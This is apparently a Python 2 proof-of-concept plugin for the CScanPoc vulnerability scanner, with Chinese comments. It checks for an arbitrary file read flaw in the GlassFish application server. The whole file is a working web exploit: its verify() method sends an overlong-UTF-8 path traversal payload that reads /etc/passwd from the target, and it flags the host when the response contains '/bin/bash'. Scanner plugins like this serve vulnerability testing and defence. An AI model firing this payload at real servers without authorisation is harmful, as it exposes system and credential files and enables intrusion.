# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'GlassFish_0000' # 平台漏洞编号，留空
    name = '应用服务器glassfish存在通用任意文件读取漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2016-01-11'  # 漏洞公布时间
    desc = '''
        应用服务器GlassFish存在通用任意文件读取漏洞
    ''' # 漏洞描述
    ref = 'Uknown' # https://wooyun.shuimugan.com/bug/view?bug_no=0144595
    cnvd_id = 'Uknown' # cnvd漏洞编号
    cve_id = 'Uknown' #cve编号
    product = 'GlassFish'  # 漏洞应用名称
    product_version = 'Uknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '944e3de0-35aa-48ea-8210-e7ca75a1fd11' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
            code, head, res, errcode, _ = hh.http(arg + payload)
            if code == 200 and '/bin/bash' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()